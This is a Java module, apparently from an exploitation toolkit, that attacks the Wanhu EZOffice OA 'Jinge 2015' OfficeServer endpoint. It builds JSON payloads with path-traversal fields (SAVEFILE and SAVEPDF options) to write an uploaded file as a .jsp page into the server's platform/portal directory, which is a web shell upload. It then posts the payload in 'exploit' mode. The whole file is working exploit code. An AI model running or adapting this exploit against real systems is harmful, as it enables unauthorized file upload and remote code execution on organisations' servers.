package com.droplab.Controller.EZOffice.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;

/**
 * 万户OA金格2015文件上传
 */
public class EZOfficeOfficeServer2015 extends BugService {
    private final String contentPath = "/OfficeServer";

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String filepath = null;
                String mOption = "";
                String filename = "";
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("mOption")) {
                        mOption = params.get(key);
                    } else if (key.equals("filename")) {
                        filename = params.get(key);
                    }
                }
                String payload = null;
                switch (mOption) {
                    case "SAVEFILE":
                        HashMap hashMap = new HashMap();
                        hashMap.put("OPTION",mOption);
                        hashMap.put("USERID","1");
                        hashMap.put("RECORDID",CommonUtils.Random());
                        hashMap.put("FILENAME","portal"+filename+".jsp");
                        hashMap.put("FILETYPE","JPEG");
                        hashMap.put("ISADDTEMPLATE","false");
                        hashMap.put("USERNAME","admin");
                        hashMap.put("MODULETYPE","/../platform/");
                        hashMap.put("ONLINEEDITING","onLineEditing");
                        hashMap.put("TEMPLATE",CommonUtils.Random());
                        hashMap.put("ISDOC","true");
                        payload = getPayload(hashMap);
                        break;
                    case "SAVEPDF":
                        HashMap SAVEPDFMAP = new HashMap();
                        SAVEPDFMAP.put("OPTION",mOption);
                        SAVEPDFMAP.put("PDFPZ","1");
                        SAVEPDFMAP.put("FILENAMETRUE","../../../platform/portal/"+filename+".jsp");
                        payload = getPayload(SAVEPDFMAP);
                        break;
                    default:
                        payload = null;
                }
                if (!url.equals("") && !type.equals("") && payload != null) {
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    headers.put("Accept", "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8");
                    HashMap<String, File> FileMap = new HashMap<String, File>();
                    FileMap.put("files",new File(filepath));
                    HashMap<String, String> paramMap = new HashMap<>();
                    paramMap.put("json",payload);
                    Connection.Response response = HttpUtils.post(url + contentPath, headers,paramMap,FileMap);
                    if (type.equals("exploit")) {
                        return response;
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    private String getPayload(HashMap hashMap){
        if (!hashMap.isEmpty()){
            StringBuilder payload = new StringBuilder();
            payload.append("{");
            Iterator iterator = hashMap.keySet().iterator();
            int i=0;
            while (iterator.hasNext()){
                i++;
                String key =(String) iterator.next();
                String value = (String) hashMap.get(key);
                payload.append(String.format("\"%s\":\"%s\"",key,value));
                if (i < hashMap.size() ){
                    payload.append(",");
                }
            }
            payload.append("}");
            return payload.toString();
        }
        return null;
    }
}
